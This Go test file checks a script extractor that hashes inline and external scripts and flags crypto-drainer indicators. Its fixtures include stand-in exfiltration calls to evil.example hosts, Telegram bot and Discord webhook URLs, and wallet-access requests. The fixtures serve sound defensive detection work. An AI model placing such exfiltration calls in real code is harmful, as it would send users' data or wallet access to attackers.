package javascript_test

import (
	"crypto/sha256"
	"fmt"
	"testing"

	"github.com/alexiares/alexiares/internal/javascript"
)

func TestExtractInlineScripts(t *testing.T) {
	rawHTML := `<html><body>
		<script>console.log('inline one')</script>
		<script src="/external.js"></script>
		<script>fetch('https://api.evil.example/drain')</script>
	</body></html>`

	got := javascript.Extract(rawHTML, []string{"/external.js"}, []string{"console.log('external')"})

	if len(got.InlineScripts) != 2 {
		t.Fatalf("InlineScripts = %v, want 2 entries", got.InlineScripts)
	}
	if got.InlineScripts[0] != "console.log('inline one')" {
		t.Errorf("InlineScripts[0] = %q", got.InlineScripts[0])
	}

	// 2 inline + 1 external = 3 hashes.
	if len(got.SHA256) != 3 {
		t.Fatalf("SHA256 = %v, want 3 hashes", got.SHA256)
	}
	wantHash := fmt.Sprintf("%x", sha256.Sum256([]byte("console.log('external')")))
	found := false
	for _, h := range got.SHA256 {
		if h == wantHash {
			found = true
		}
	}
	if !found {
		t.Error("SHA256 does not include hash of external script body")
	}
}

func TestExtractDetectsIndicators(t *testing.T) {
	scripts := []string{
		`fetch("https://api.telegram.org/bot123456:ABCDEF/sendMessage")`,
		`const hook = "https://discord.com/api/webhooks/123456789/token_abc-DEF"`,
		`import { WalletConnectProvider } from "@walletconnect/web3-provider"`,
		`window.ethereum.request({method: "eth_requestAccounts"})`,
		`fetch("https://exfil.evil.example/collect")`,
		`t.me/drainer_support`,
	}

	got := javascript.Extract("<html></html>", nil, scripts)

	if len(got.TelegramRefs) != 2 {
		t.Errorf("TelegramRefs = %v, want 2 matches (api.telegram.org + t.me)", got.TelegramRefs)
	}
	if len(got.DiscordWebhooks) != 1 {
		t.Errorf("DiscordWebhooks = %v, want 1 match", got.DiscordWebhooks)
	}
	if len(got.WalletConnectRefs) == 0 {
		t.Error("WalletConnectRefs = empty, want at least one match")
	}
	foundEthereum := false
	for _, lib := range got.WalletLibraries {
		if lib == "window.ethereum" {
			foundEthereum = true
		}
	}
	if !foundEthereum {
		t.Errorf("WalletLibraries = %v, want window.ethereum detected", got.WalletLibraries)
	}
	if len(got.APIEndpoints) == 0 {
		t.Error("APIEndpoints = empty, want at least one URL detected")
	}
}

func TestExtractDeduplicatesAndSorts(t *testing.T) {
	scripts := []string{
		`t.me/samechannel`,
		`t.me/samechannel`,
	}
	got := javascript.Extract("<html></html>", nil, scripts)
	if len(got.TelegramRefs) != 1 {
		t.Errorf("TelegramRefs = %v, want deduplicated to 1", got.TelegramRefs)
	}
}

func TestExtractEmptyInput(t *testing.T) {
	got := javascript.Extract("", nil, nil)
	if len(got.SHA256) != 0 || len(got.InlineScripts) != 0 {
		t.Errorf("Extract empty input = %+v, want empty", got)
	}
}
